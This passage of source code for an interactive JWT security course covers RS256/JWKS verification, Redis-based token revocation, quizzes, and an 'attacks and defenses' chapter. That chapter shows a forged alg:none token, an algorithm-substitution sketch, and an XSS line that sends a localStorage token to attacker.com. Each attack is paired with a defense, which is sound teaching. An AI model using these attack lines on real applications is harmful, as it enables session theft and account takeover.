      algorithm: 'RS256', // ← RSA with SHA-256
      expiresIn: '15m',
      issuer:    'auth-service',
      audience:  'api-services',
      keyid:     'rsa-key-v1' // key ID for JWKS lookup
    }
  );
};

// Verify JWT using PUBLIC KEY
// Any service can call this — they only need the public key
const verifyAccessToken = (token) => {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'], // ONLY accept RS256 — reject HS256 (prevents attack)
    issuer:    'auth-service',
    audience:  'api-services'
  });
};

module.exports = { generateAccessToken, verifyAccessToken, PUBLIC_KEY };</code></pre>
      <div class="file-tag">src/routes/jwks.js — JWKS endpoint (JSON Web Key Set)</div>
      <pre><code class="language-javascript">const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();
const { PUBLIC_KEY } = require('../utils/tokenUtils');

// Convert PEM-format public key to JWK (JSON Web Key) format
function pemToJwk(pemPublicKey) {
  // Create a Node.js KeyObject from the PEM string
  const keyObject = crypto.createPublicKey(pemPublicKey);

  // Export as JWK (RFC 7517 standard format)
  const jwk = keyObject.export({ format: 'jwk' });

  return {
    kty: jwk.kty,       // Key Type: "RSA"
    use: 'sig',         // Use: "sig" (signature), not "enc" (encryption)
    alg: 'RS256',       // Algorithm
    kid: 'rsa-key-v1',  // Key ID — must match the kid in your token header
    n: jwk.n,           // RSA modulus (base64url)
    e: jwk.e            // RSA exponent (usually "AQAB")
  };
}

// GET /.well-known/jwks.json
// This is the standard OIDC/OAuth2 endpoint for public keys
// Other services/clients fetch this to get the public key
router.get('/.well-known/jwks.json', (req, res) => {
  res.json({
    keys: [
      pemToJwk(PUBLIC_KEY)
      // If you have multiple keys (during key rotation), list them all here
    ]
  });
});

module.exports = router;</code></pre>
      <div class="file-tag">services/product-service/auth.js — verify without private key</div>
      <pre><code class="language-javascript">const jwt    = require('jsonwebtoken');
const crypto = require('crypto');

// Cache the public key so we don't fetch it on every request
let cachedPublicKey = null;
let keyFetchedAt    = null;
const KEY_CACHE_TTL = 3600 * 1000; // re-fetch public key every 1 hour

async function getPublicKey() {
  const now = Date.now();

  // Return cached key if fresh
  if (cachedPublicKey && keyFetchedAt && (now - keyFetchedAt) < KEY_CACHE_TTL) {
    return cachedPublicKey;
  }

  // Fetch JWKS from auth service
  const res = await fetch('http://auth-service:5000/.well-known/jwks.json');
  if (!res.ok) throw new Error('Failed to fetch JWKS');

  const { keys } = await res.json();

  // Find the key matching our expected key ID
  const keyData = keys.find(k => k.kid === 'rsa-key-v1' && k.alg === 'RS256');
  if (!keyData) throw new Error('Expected key not found in JWKS');

  // Convert JWK to PEM format (what jsonwebtoken library expects)
  const keyObject = crypto.createPublicKey({ key: keyData, format: 'jwk' });
  cachedPublicKey = keyObject.export({ type: 'spki', format: 'pem' });
  keyFetchedAt    = now;

  return cachedPublicKey;
}

// Middleware for product service to verify tokens
const verifyToken = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const publicKey = await getPublicKey();

    // The product service ONLY has the public key
    // It can VERIFY but CANNOT CREATE tokens — perfect
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer:    'auth-service',
      audience:  'api-services'
    });

    req.user = decoded;
    next();

  } catch (err) {
    if (err.name === 'TokenExpiredError')
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    res.status(403).json({ error: 'Invalid token' });
  }
};

module.exports = verifyToken;</code></pre>
    `
  },
  // Chapter 7: Method 5 — Token Revocation
  {
    id: "method5",
    group: "Implementation Methods",
    label: "Method 5 — Token Revocation",
    quiz: {
      q: "A user's account is compromised. You immediately disable their account in the database. They have a valid JWT with 14 minutes remaining. What happens?",
      opts: [
        "Their JWT is instantly invalid because you disabled the account",
        "Their JWT still works for 14 more minutes — JWT is stateless, the server doesn't re-check the database on every request unless you explicitly add that check",
        "Their browser detects the account was disabled and clears the token",
        "The JWT expires immediately when account is disabled"
      ],
      ans: 1,
      exp: "This is the core JWT stateless problem. Disabling the account in the database doesn't invalidate existing JWTs — the server just checks the signature, not the database. Solutions: (1) Redis blocklist with jti — check on every request, (2) tokenVersion approach — include version in token, increment on disable, (3) short expiry times to minimize damage window."
    },
    content: `
      <h2>Method 5 — Token Revocation with Redis</h2>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — Hotel master key list</div>
        <p>A hotel gives guests keycards. Each keycard works until its programmed expiry date. Normally, the key reader doesn't call anyone — it just reads the card.</p>
        <p>But for lost or stolen keys, the hotel keeps a <strong>hot list</strong> — a list of key codes that should be rejected immediately, even if the card hasn't expired yet. Every key reader checks this hot list first. Redis = the hot list. The jti claim = the key's unique code.</p>
      </div>
      <h2>The revocation problem with JWT</h2>
      <div class="g2">
        <div class="mini-card" style="border-color:var(--red-border)"><h4 style="color:var(--red)">Problem: Statelessness cuts both ways</h4><p>JWT's biggest advantage (no DB lookup) is also its biggest problem. You can't "delete" a token because the server never stored it.</p></div>
        <div class="mini-card"><h4>When you need revocation</h4><p>User logout, password change, account suspension, suspicious activity detected, stolen token, admin revocation.</p></div>
      </div>
      <div class="alert alert-info"><strong>Strategy:</strong> Add a unique <code>jti</code> (JWT ID) to every token. On revocation, store the <code>jti</code> in Redis with a TTL equal to the token's remaining lifetime. On every request, check Redis. When the token would have expired anyway, Redis auto-deletes the entry — no cleanup needed.</div>
      <hr class="divider">
      <h2>Complete implementation</h2>
      <div class="file-tag">src/config/redis.js</div>
      <pre><code class="language-javascript">const Redis = require('ioredis');

const redis = new Redis({
  host:             process.env.REDIS_HOST     || 'localhost',
  port:             parseInt(process.env.REDIS_PORT) || 6379,
  password:         process.env.REDIS_PASSWORD || undefined,
  db:               0, // database index (0-15)
  retryStrategy:    (times) => Math.min(times * 100, 3000),
  // retryStrategy: wait 100ms, 200ms, 300ms... up to 3000ms between reconnects
  enableOfflineQueue: false
  // Don't queue commands when disconnected — fail fast
});

redis.on('connect',           () => console.log('Redis connected'));
redis.on('error',   (err)     => console.error('Redis error:', err));
redis.on('reconnecting',      () => console.log('Redis reconnecting...'));

module.exports = redis;</code></pre>
      <div class="file-tag">src/utils/tokenUtils.js — with jti</div>
      <pre><code class="language-javascript">const jwt    = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid'); // npm install uuid

// Every token gets a unique jti (JWT ID)
const generateAccessToken = (user) => {
  return jwt.sign(
    {
      sub:  user._id.toString(),
      email: user.email,
      role:  user.role,
      jti:   uuidv4()
      // uuidv4() generates: "550e8400-e29b-41d4-a716-446655440000"
      // Every single token gets a different, globally unique ID
    },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m', algorithm: 'HS256' }
  );
};

// Helper to get remaining lifetime of a token in seconds
const getTokenTTL = (decoded) => {
  const now = Math.floor(Date.now() / 1000);
  return Math.max(0, decoded.exp - now); // seconds remaining
};

module.exports = { generateAccessToken, getTokenTTL };</code></pre>
      <div class="file-tag">src/services/revocationService.js</div>
      <pre><code class="language-javascript">const redis = require('../config/redis');

const BLOCKLIST_PREFIX = 'blocklist:jti:';
// Keys in Redis will be like: "blocklist:jti:550e8400-..."

// Add a token's jti to the blocklist
// The token will be blocked until 'ttlSeconds' passes
// Then Redis auto-deletes the key — no cleanup needed
const revokeToken = async (jti, ttlSeconds) => {
  if (!jti || ttlSeconds <= 0) return;
  const redisKey = BLOCKLIST_PREFIX + jti;
  // SETEX = set key with expiry
  // After ttlSeconds, Redis deletes this key automatically
  await redis.setex(redisKey, Math.ceil(ttlSeconds), '1');
  // '1' is just a placeholder value — we only care if the key exists
};

// Check if a token's jti is in the blocklist
// Returns true if token has been revoked, false if still valid
const isTokenRevoked = async (jti) => {
  if (!jti) return false;
  const redisKey = BLOCKLIST_PREFIX + jti;
  const value    = await redis.get(redisKey);
  // redis.get returns null if key doesn't exist
  return value !== null; // true = revoked, false = still valid
};

module.exports = { revokeToken, isTokenRevoked };</code></pre>
      <div class="file-tag">src/middleware/authMiddleware.js — with revocation check</div>
      <pre><code class="language-javascript">const { verifyAccessToken, getTokenTTL }  = require('../utils/tokenUtils');
const { isTokenRevoked }                  = require('../services/revocationService');

const authMiddleware = async (req, res, next) => {
  try {
    // 1. Extract token from header
    const authHeader = req.headers['authorization'];
    if (!authHeader?.startsWith('Bearer '))
      return res.status(401).json({ error: 'Authorization header missing or invalid' });

    const token = authHeader.split(' ')[1];

    // 2. Verify signature and expiry (throws if invalid)
    const decoded = verifyAccessToken(token);

    // 3. Check revocation list in Redis
    // This IS a database call — but Redis is extremely fast
    // (sub-millisecond, in-memory) and much faster than a full DB query
    if (decoded.jti) {
      const revoked = await isTokenRevoked(decoded.jti);
      if (revoked) {
        return res.status(401).json({
          error: 'This session has been invalidated. Please log in again.',
          code:  'TOKEN_REVOKED'
        });
      }
    }

    // 4. All checks passed — attach user to request
    req.user    = decoded;
    req.userJti = decoded.jti; // make jti easily accessible
    next();

  } catch (err) {
    if (err.name === 'TokenExpiredError')
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    if (err.name === 'JsonWebTokenError')
      return res.status(403).json({ error: 'Invalid token', code: 'INVALID_TOKEN' });
    console.error('Auth middleware error:', err);
    res.status(500).json({ error: 'Authentication error' });
  }
};

module.exports = { authMiddleware };</code></pre>
      <div class="file-tag">src/controllers/authController.js — logout revokes token</div>
      <pre><code class="language-javascript">const { revokeToken }  = require('../services/revocationService');
const { getTokenTTL }  = require('../utils/tokenUtils');

// POST /api/auth/logout
exports.logout = async (req, res) => {
  try {
    // req.user.jti = the jti claim from the verified JWT
    const { jti, exp } = req.user;

    if (jti) {
      // Calculate how many seconds remain before this token would expire naturally
      const ttl = getTokenTTL({ exp });

      // Add to Redis blocklist until the token would have expired
      // After that, Redis auto-deletes the entry — no cleanup code needed
      await revokeToken(jti, ttl);
    }

    // Also clear the refresh token cookie
    res.clearCookie('refreshToken');

    res.json({ message: 'Logged out successfully' });

  } catch (err) {
    console.error('Logout error:', err);
    res.status(500).json({ error: 'Logout failed' });
  }
};

// POST /api/auth/revoke/:userId  (admin only)
exports.revokeUserSession = async (req, res) => {
  // This uses the tokenVersion approach to revoke ALL tokens for a user
  // It increments tokenVersion, making all existing refresh tokens invalid
  // Combined with short access token expiry, this limits damage
  try {
    await User.findByIdAndUpdate(req.params.userId, {
      $inc: { tokenVersion: 1 },
      isActive: req.body.disable ? false : undefined
    });

    res.json({ message: 'User sessions revoked' });
  } catch (err) {
    res.status(500).json({ error: 'Revocation failed' });
  }
};</code></pre>
      <div class="alert alert-ok"><strong>Performance note:</strong> Redis is in-memory — reads take under 1 millisecond. For most apps, the cost of this blocklist check is negligible. For very high-traffic systems, use Redis Cluster for horizontal scaling.</div>
    `
  },
  // Chapter 8: Security & Best Practices
  {
    id: "security",
    group: "Security & Best Practices",
    label: "Attacks & Defenses",
    quiz: {
      q: "Your app uses HS256. An attacker obtains the JWT payload and tries to forge an admin token. They don't know your secret. They run the token through a tool that tries 'password', 'secret', 'jwt-secret', '123456' as the HMAC key and one works. What went wrong?",
      opts: [
        "The algorithm HS256 is broken",
        "The secret was too simple and was brute-forced offline — attackers can test millions of guesses against a stolen JWT without making any server requests",
        "The attacker exploited a JWT library bug",
        "JWT cannot prevent this attack"
      ],
      ans: 1,
      exp: "HS256 is not broken — but HMAC-SHA256 with a weak secret is easily brute-forced offline. The attacker doesn't need network access — they just have the stolen token and a word list. A proper secret must be at least 256 bits of cryptographic randomness: node -e \"console.log(require('crypto').randomBytes(64).toString('hex'))\""
    },
    content: `
      <h2>JWT Security — every attack and how to defend</h2>
      <div class="alert alert-err"><strong>Security mindset:</strong> JWT is secure by design — but only when implemented correctly. Most JWT vulnerabilities come from developers misusing the library, not from flaws in the JWT standard itself.</div>
      <h2>Attack 1 — alg:none (signature bypass)</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>Early JWT libraries had a bug: if you set <code>"alg":"none"</code> in the header, they would skip signature verification entirely. An attacker could forge any payload.</p>
        <pre><code class="language-javascript">// Attacker creates:
header  = {"alg":"none","typ":"JWT"}
payload = {"sub":"1","role":"admin","exp":9999999999}

// Encoded token (no signature needed):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.</code></pre>
        <h4>Defense</h4>
        <pre><code class="language-javascript">// ALWAYS whitelist algorithms explicitly
jwt.verify(token, secret, {
  algorithms: ['HS256'] // ONLY accept HS256 — rejects 'none', RS256, etc.
});</code></pre>
      </div>
      <h2>Attack 2 — Weak secret brute force</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>If your HS256 secret is weak, an attacker who has a token can try millions of HMAC computations per second offline (no network requests needed) until the signature matches.</p>
        <pre><code class="language-javascript">// Bad secrets — easily brute-forced:
process.env.JWT_SECRET = "secret"
process.env.JWT_SECRET = "password123"
process.env.JWT_SECRET = "jwt_secret_key"
process.env.JWT_SECRET = "myapp"</code></pre>
        <h4>Defense</h4>
        <pre><code class="language-javascript">// Generate a cryptographically random 64-byte secret
// Run this ONCE and store the output in your .env file
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
// Output example:
// a3f8c2e1d9b7...f4e3c2b1a0d9e8f7c6b5a4c3d2e1f0a9 (128 hex chars = 64 bytes = 512 bits)</code></pre>
      </div>
      <h2>Attack 3 — RS256 → HS256 algorithm substitution</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>If your server uses RS256 but doesn't whitelist algorithms, an attacker can create an HS256 token and use your PUBLIC KEY as the HMAC secret. Since the public key is known, they can forge any token.</p>
        <pre><code class="language-javascript">// Vulnerable code:
jwt.verify(token, publicKey) // ← no algorithms restriction!

// Attack: create HS256 token using your PUBLIC KEY as the HMAC secret
// jwt.sign(payload, PUBLIC_KEY, { algorithm: 'HS256' })</code></pre>
        <h4>Defense</h4>
        <pre><code class="language-javascript">// ALWAYS specify algorithms when using RS256
jwt.verify(token, publicKey, {
  algorithms: ['RS256'] // rejects any HS256 attempt
});</code></pre>
      </div>
      <h2>Attack 4 — jwt.decode() instead of jwt.verify()</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>A developer uses <code>jwt.decode()</code> thinking it verifies the token. It doesn't — it just Base64-decodes with zero security checks.</p>
        <pre><code class="language-javascript">// WRONG — DO NOT USE ON SERVER
const decoded = jwt.decode(token);
// This does ZERO verification. Any payload is "valid".
// An attacker can send: {"sub":"admin","role":"admin","exp":9999999}
// in a plaintext base64 token and it will be accepted

// CORRECT
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
// Throws if: signature wrong, expired, wrong issuer, wrong audience</code></pre>
      </div>
      <h2>Attack 5 — XSS token theft from localStorage</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>An attacker finds an XSS vulnerability in your app (e.g., unsanitized user-generated content displayed to other users). They inject a script that steals the JWT.</p>
        <pre><code class="language-javascript">// Attacker's injected script
fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'));</code></pre>
        <h4>Defense</h4>
        <pre><code class="language-javascript">// 1. Use HttpOnly cookies for refresh tokens (Method 2)
// 2. Store access token in memory, not localStorage
// 3. Implement Content Security Policy headers
// 4. Sanitize ALL user input before displaying
// 5. Use helmet.js for security headers
const helmet = require('helmet');
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],  // no inline scripts, no external scripts
  }
}));</code></pre>
      </div>
      <h2>Attack 6 — Missing claim validation</h2>
      <div class="card card-red">
        <h4>How it works</h4>
        <p>An attacker issues themselves a token from a different server (their own auth service) with admin privileges. Your server verifies the signature (valid for their server) but accepts it.</p>
        <pre><code class="language-javascript">// Vulnerable: only checks signature
jwt.verify(token, secret);

// Attack: attacker's server issues token with valid signature
// { sub: "attacker", role: "admin" }
// Your server verifies signature → valid! (attacker signed it with their key)
// But now attacker has admin access</code></pre>
        <h4>Defense</h4>
        <pre><code class="language-javascript">// Validate ALL claims
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  issuer:    'myapp-auth',  // MUST match — attacker's issuer is different
  audience:  'myapp-api',   // MUST match
});</code></pre>
      </div>
      <h2>Complete security checklist</h2>
      <pre><code class="language-javascript">SERVER SIDE:
  [x] Always use jwt.verify(), NEVER jwt.decode() on server
  [x] Whitelist algorithms: algorithms: ['HS256'] or ['RS256']  
  [x] Validate iss (issuer) and aud (audience) claims
  [x] Keep access tokens short-lived (15 minutes)
  [x] Use strong 64-byte random secret for HS256
  [x] Store secrets in env vars, never in code
  [x] Use HTTPS only in production (secure cookie flag)
  [x] Rate-limit /login endpoint (10 attempts / 15 min)
  [x] Use bcrypt with cost factor 12 for passwords
  [x] Log auth failures (not passwords/tokens)
  [x] Add helmet.js for security headers

CLIENT SIDE:
  [x] Use HttpOnly cookies for refresh tokens
  [x] Store access tokens in memory, not localStorage  
  [x] Clear tokens on logout
  [x] Handle 401 responses gracefully
  [x] Sanitize all user input before display (prevent XSS)
  [x] Implement Content Security Policy

INFRASTRUCTURE:
  [x] Rotate JWT secrets periodically (use kid for zero-downtime)
  [x] Use Redis blocklist for immediate revocation if needed
  [x] Monitor for unusual login patterns
  [x] Set up alerts for mass token failures</code></pre>
    `
  }
];

// ============================================================
// REACT COMPONENT
// ============================================================

const JWTMasteryCourse = () => {
  const [currentChapterId, setCurrentChapterId] = useState(chapters[0].id);
  const [doneChapters, setDoneChapters] = useState(new Set());
  const [quizAnswers, setQuizAnswers] = useState({});

  // Load saved progress from localStorage
  useEffect(() => {
    const savedDone = localStorage.getItem('jwt_course_done');
    const savedAnswers = localStorage.getItem('jwt_course_answers');
    if (savedDone) setDoneChapters(new Set(JSON.parse(savedDone)));
    if (savedAnswers) setQuizAnswers(JSON.parse(savedAnswers));
  }, []);

  // Save progress to localStorage
  useEffect(() => {
    localStorage.setItem('jwt_course_done', JSON.stringify([...doneChapters]));
    localStorage.setItem('jwt_course_answers', JSON.stringify(quizAnswers));
  }, [doneChapters, quizAnswers]);

  const currentChapter = chapters.find(c => c.id === currentChapterId);
  const currentIndex = chapters.findIndex(c => c.id === currentChapterId);
  const totalQuizzes = chapters.filter(c => c.quiz).length;
  const completedQuizzes = doneChapters.size;
  const progress = (completedQuizzes / totalQuizzes) * 100;

  const handleAnswerQuiz = (chapterId, selectedIndex) => {
    const chapter = chapters.find(c => c.id === chapterId);
    const isCorrect = selectedIndex === chapter.quiz.ans;

    setQuizAnswers(prev => ({ ...prev, [chapterId]: selectedIndex }));

    if (isCorrect) {
      setDoneChapters(prev => new Set([...prev, chapterId]));
    }
  };

  const goToChapter = (id) => {
    setCurrentChapterId(id);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const goToNextChapter = () => {
    if (currentIndex < chapters.length - 1) {
      setCurrentChapterId(chapters[currentIndex + 1].id);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  };

  // Re-run syntax highlighting after content renders
useEffect(() => {
  console.log('hljs available?', !!window.hljs);
  if (window.hljs) {
    const blocks = document.querySelectorAll('pre code');
    console.log('code blocks found:', blocks.length);
    blocks.forEach((block) => {
      window.hljs.highlightElement(block);
    });
  }
}, [currentChapterId]);

  // Group chapters for sidebar
  const groupedChapters = chapters.reduce((acc, ch) => {
    if (!acc[ch.group]) acc[ch.group] = [];
    acc[ch.group].push(ch);
    return acc;
  }, {});

  return (
    <div className="flex flex-col md:flex-row min-h-screen bg-[#0f1117] text-[#e2e8f0]">
      {/* Sidebar */}
      <div className="md:w-72 md:sticky md:top-0 md:h-screen bg-[#161b27] border-r border-[#2a3347] overflow-y-auto">
        <div className="p-4 pb-4 border-b border-[#2a3347]">
          <h1 className="text-lg font-bold text-[#10b981]">JWT Mastery</h1>
          <p className="text-xs text-[#64748b]">Complete Course</p>
        </div>
        {Object.entries(groupedChapters).map(([groupName, groupChapters]) => (
          <div key={groupName} className="mb-4">
            <div className="text-[10px] font-bold text-[#64748b] uppercase tracking-wider px-4 mb-2">
              {groupName}
            </div>
            {groupChapters.map((chapter) => {
              const isActive = chapter.id === currentChapterId;
              const isDone = chapter.quiz && doneChapters.has(chapter.id);
              return (
                <button
                  key={chapter.id}
                  onClick={() => goToChapter(chapter.id)}
                  className={`
                    w-full text-left px-4 py-2 text-sm transition-all duration-150
                    flex items-center gap-3
                    ${isActive
                      ? 'text-[#10b981] bg-[#1d2535] border-l-2 border-[#10b981]'
                      : 'text-[#94a3b8] hover:bg-[#1d2535] hover:text-white border-l-2 border-transparent'
                    }
                  `}
                >
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${isDone ? 'bg-[#10b981]' : 'bg-[#334060]'}`} />
                  <span className="truncate">{chapter.label}</span>
                </button>
              );
            })}
          </div>
        ))}
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto">
        <div className="max-w-5xl mx-auto px-4 py-6 md:px-8 md:py-8">
          {/* Progress Bar */}
          <div className="mb-6">
            <div className="flex justify-between text-xs text-[#64748b] mb-1">
              <span>Course Progress</span>
              <span>{completedQuizzes}/{totalQuizzes} chapters completed</span>
            </div>
            <div className="h-1 bg-[#1d2535] rounded-full overflow-hidden">
              <div
                className="h-full bg-linear-to-r from-[#059669] to-[#10b981] rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Chapter Header */}
          <div className="mb-6 pb-4 border-b border-[#2a3347]">
            <div className="inline-flex items-center gap-2 text-xs font-bold text-[#10b981] bg-[#052e1a] border border-[#064e2e] px-3 py-1 rounded-full mb-3">
              <span>{currentChapter.group}</span>
              <span>·</span>
              <span>{currentIndex + 1} of {chapters.length}</span>
            </div>
            <h1 className="text-2xl md:text-3xl font-bold text-white mb-1">
              {currentChapter.label}
            </h1>
          </div>

          {/* Chapter Content */}
          <div
            className="chapter-content"
            dangerouslySetInnerHTML={{ __html: currentChapter.content }}
          />

          {/* Quiz Section */}
          {currentChapter.quiz && (
            <div className="mt-8 pt-6 border-t border-[#2a3347]">
              <div className="text-xs font-bold text-[#10b981] uppercase tracking-wider mb-3">
                Knowledge Check
              </div>
              <div className="text-base font-semibold text-white mb-4">
                {currentChapter.quiz.q}
              </div>

              <div className="space-y-2">
                {currentChapter.quiz.opts.map((opt, idx) => {
                  const selectedAnswer = quizAnswers[currentChapter.id];
                  const getOptionClass = () => {
                    if (selectedAnswer === undefined) return 'border-[#334060] hover:border-[#10b981] hover:bg-[#1d2535]';
                    if (idx === currentChapter.quiz.ans) return 'border-[#10b981] bg-[#052e1a] text-[#6ee7b7]';
                    if (idx === selectedAnswer && selectedAnswer !== currentChapter.quiz.ans) return 'border-[#ef4444] bg-[#1a0505] text-[#fca5a5]';
                    return 'border-[#334060] opacity-50';
                  };
                  return (
                    <button
                      key={idx}
                      onClick={() => selectedAnswer === undefined && handleAnswerQuiz(currentChapter.id, idx)}
                      disabled={selectedAnswer !== undefined}
                      className={`
                        w-full text-left p-3 rounded-md border transition-all duration-150 text-sm
                        ${getOptionClass()}
                        ${selectedAnswer !== undefined ? 'cursor-default' : 'cursor-pointer'}
                      `}
                    >
                      {opt}
                    </button>
                  );
                })}
              </div>

              {quizAnswers[currentChapter.id] !== undefined && (
                <div className="mt-4">
                  <div className={`p-3 rounded-md text-sm ${quizAnswers[currentChapter.id] === currentChapter.quiz.ans ? 'bg-[#052e1a] border border-[#064e2e] text-[#6ee7b7]' : 'bg-[#1a0505] border border-[#4a1010] text-[#fca5a5]'}`}>
                    {quizAnswers[currentChapter.id] === currentChapter.quiz.ans ? '✓ Correct! ' : '✗ Not quite. '}
                    {currentChapter.quiz.exp}
                  </div>

                  {quizAnswers[currentChapter.id] === currentChapter.quiz.ans && currentIndex < chapters.length - 1 && (
                    <button
                      onClick={goToNextChapter}
                      className="mt-4 px-4 py-2 bg-[#059669] hover:bg-[#10b981] text-white rounded-md text-sm font-medium transition-colors"
                    >
                      Next Chapter →
                    </button>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      {/* Embedded styles for chapter content */}
      <style>{`
        :root{
          --bg:#0f1117;--bg2:#161b27;--bg3:#1d2535;--bg4:#242d40;
          --border:#2a3347;--border2:#334060;
          --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
          --green:#10b981;--green2:#059669;--green-bg:#052e1a;--green-border:#064e2e;
          --blue:#3b82f6;--blue2:#2563eb;--blue-bg:#0a1628;--blue-border:#1e3a5f;
          --amber:#f59e0b;--amber-bg:#1a1000;--amber-border:#4a2e00;
          --red:#ef4444;--red-bg:#1a0505;--red-border:#4a1010;
          --purple:#a78bfa;--purple-bg:#12082a;--purple-border:#3b1f6e;
          --cyan:#22d3ee;--cyan-bg:#021a1f;
          --radius:10px;--radius-sm:6px;
        }
        .chapter-content *{box-sizing:border-box;}
        .chapter-content h2{font-size:17px;font-weight:700;color:var(--text);margin:1.75rem 0 .6rem;padding-top:.25rem}
        .chapter-content h3{font-size:14px;font-weight:700;color:var(--cyan);margin:1.25rem 0 .4rem}
        .chapter-content h4{font-size:13px;font-weight:600;color:var(--purple);margin:.9rem 0 .3rem}
        .chapter-content p{font-size:13px;line-height:1.8;color:var(--text2);margin-bottom:.65rem}
        .chapter-content ul,.chapter-content ol{padding-left:1.3rem;font-size:13px;line-height:1.9;color:var(--text2);margin-bottom:.65rem}
        .chapter-content li{margin-bottom:1px}
        .chapter-content strong{color:var(--text);font-weight:600}
        .chapter-content code{font-family:'Fira Code','Consolas',monospace;font-size:11px;background:var(--bg4);color:var(--cyan);padding:2px 6px;border-radius:4px;border:1px solid var(--border2)}
        .chapter-content pre{font-family:'Fira Code','Consolas',monospace;font-size:12px;border:1px solid var(--border2);border-radius:var(--radius);padding:1rem 1.25rem;overflow-x:auto;line-height:1.7;margin-bottom:.85rem;white-space:pre}
        .chapter-content .file-tag{font-size:10px;font-weight:700;color:var(--text3);background:var(--bg4);border:1px solid var(--border);border-bottom:none;padding:5px 12px;border-radius:var(--radius) var(--radius) 0 0;display:inline-flex;align-items:center;gap:6px;margin-bottom:-2px}
        .chapter-content .file-tag+pre{border-radius:0 var(--radius) var(--radius) var(--radius)}
        .chapter-content .card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:1rem 1.25rem;margin-bottom:.85rem}
        .chapter-content .card-green{border-color:var(--green-border);background:var(--green-bg)}
        .chapter-content .card-blue{border-color:var(--blue-border);background:var(--blue-bg)}
        .chapter-content .card-amber{border-color:var(--amber-border);background:var(--amber-bg)}
        .chapter-content .card-red{border-color:var(--red-border);background:var(--red-bg)}
        .chapter-content .card-purple{border-color:var(--purple-border);background:var(--purple-bg)}
        .chapter-content .alert{padding:10px 14px;border-radius:var(--radius-sm);font-size:12.5px;margin-bottom:.75rem;line-height:1.7}
        .chapter-content .alert-info{background:var(--blue-bg);border:1px solid var(--blue-border);color:#93c5fd}
        .chapter-content .alert-ok{background:var(--green-bg);border:1px solid var(--green-border);color:#6ee7b7}
        .chapter-content .alert-warn{background:var(--amber-bg);border:1px solid var(--amber-border);color:#fcd34d}
        .chapter-content .alert-err{background:var(--red-bg);border:1px solid var(--red-border);color:#fca5a5}
        .chapter-content .g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:.85rem}
        .chapter-content .g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:.85rem}
        .chapter-content .mini-card{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius-sm);padding:.75rem 1rem}
        .chapter-content .mini-card h4{margin:0 0 .3rem;font-size:12px;color:var(--text)}
        .chapter-content .mini-card p{margin:0;font-size:11.5px;color:var(--text3);line-height:1.6}
        .chapter-content .steps{display:flex;flex-direction:column;gap:6px;margin-bottom:.85rem}
        .chapter-content .step{display:flex;gap:.9rem;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius-sm);padding:.7rem .9rem;align-items:start}
        .chapter-content .step-n{width:22px;height:22px;border-radius:50%;background:var(--green-bg);border:1px solid var(--green-border);color:var(--green);font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center}
        .chapter-content .step-body{font-size:12.5px;color:var(--text2);line-height:1.65}
        .chapter-content .step-body strong{color:var(--text)}
        .chapter-content .flow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:.85rem;padding:1rem;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius)}
        .chapter-content .flow-box{background:var(--bg4);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:6px 12px;font-size:11.5px;font-weight:600;color:var(--text);text-align:center;white-space:nowrap}
        .chapter-content .flow-box.green{background:var(--green-bg);border-color:var(--green-border);color:var(--green)}
        .chapter-content .flow-box.blue{background:var(--blue-bg);border-color:var(--blue-border);color:#93c5fd}
        .chapter-content .flow-box.amber{background:var(--amber-bg);border-color:var(--amber-border);color:var(--amber)}
        .chapter-content .flow-box.red{background:var(--red-bg);border-color:var(--red-border);color:var(--red)}
        .chapter-content .flow-arr{color:var(--text3);font-size:14px}
        .chapter-content .token-wrap{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:1rem;margin-bottom:.85rem;word-break:break-all;line-height:2;font-family:'Fira Code',monospace;font-size:11px}
        .chapter-content .tok-h{background:#3b1f00;color:#fcd34d;padding:2px 5px;border-radius:3px}
        .chapter-content .tok-p{background:#05291a;color:#6ee7b7;padding:2px 5px;border-radius:3px}
        .chapter-content .tok-s{background:#1a0505;color:#fca5a5;padding:2px 5px;border-radius:3px}
        .chapter-content .tok-dot{color:var(--text3);font-weight:900;font-size:16px;padding:0 1px}
        .chapter-content .comp-table{width:100%;border-collapse:collapse;margin-bottom:.85rem;font-size:12px}
